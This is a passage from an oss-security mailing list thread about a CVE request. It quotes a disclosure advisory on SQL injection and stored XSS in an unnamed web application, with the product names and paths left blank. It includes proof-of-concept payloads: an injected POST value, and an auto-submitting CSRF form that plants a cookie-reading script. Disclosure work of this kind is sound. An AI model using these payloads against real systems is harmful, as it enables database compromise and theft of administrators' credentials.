  oss-security - Re: CVE-request:            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Wed, 28 Mar From: Kurt Seifried <kseifried@...hat.com> To: oss-security@...ts.openwall.com CC: Henri Salo <henri@...v.fi> Subject: Re: CVE-request:  On AM, Henri Salo wrote: > I won't veriify these vulnerabilities manually. Please assign CVE-identifier. >  > Original advisory: > These vulnerabilities have been fixed in revision. >  > Please do not ask me why changelog entry does not say anything about security problems. HTBridge has tested that vulnerabilities do not exist after patches. >  > From HTBridge: >  > On the 6 of July a correction was released: > >  > Details of this corrections are available here: > >  > Corrections for our vulnerabilities are marked as "User extended fields administration improvements and cleanup". >  > The changelog: confirms that this correction was applied to version. >  > - Henri Salo  Quoted the advisory below, please include this stype of stuff in future (so I can reply clearly, and in case the wbe page goes away, etc.).  Advisory Details:  ============================================================ 1. SQL injection in  Please use for this issue  The vulnerability exists due to failure in the script to properly sanitize user-supplied input in "user_field" variable. Successful exploitation of the vulnerability requires administrator's privileges, and "magic_quotes_gpc" to be disabled. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  Attacker can use browser to exploit this vulnerability. The following PoC code is available:  POST HTTP/1.1 Host: HOST Cookie: <valid session cookies> Content-Type: application/x-www-form-urlencoded Content-Length:  user_field=sss','',0, ','','', '0',  ============================================================ 2. XSS in  Please use for this issue  User can execute arbitrary JavaScript code within the vulnerable application.  The vulnerability exists due to failure in the script to properly sanitize user-supplied input in "user_include" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.  This XSS vulnerability can be exploited by a malicious user during an CSRF attack against logged-in website administrator to steal his credentials and/or perform any authorized actions with administrator's privileges.  An attacker should make logged-in victim (e.g. website administrator) visit a malicious web page to exploit this vulnerability. The following PoC is available:  poc.html <script> </script> <iframe id=f1 src='form.html'></iframe>  form.html <form method="POST" name=m> <input type="hidden" name="user_field" value="abcde1f1">  <input type="hidden" name="user_text" <input type="hidden" name="user_type" value="1"> <input type="hidden" name="user_include" value='"><script>alert(document.cookie)</script>'> <input type="hidden" name="add_field" value="1"> <input type="hidden" name="user_parent" value="0"> <input type="hidden" name="user_required" value="0"> <input type="hidden" name="user_applicable" <input type="hidden" name="user_read" value="0"> <input type="hidden" name="user_write" <input type="hidden" name="user_hide" value="0"> <input type=submit> </form> <script> document.m.submit(); </script> ============================================================  --  Kurt Seifried Red Hat Security Response Team (SRT)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      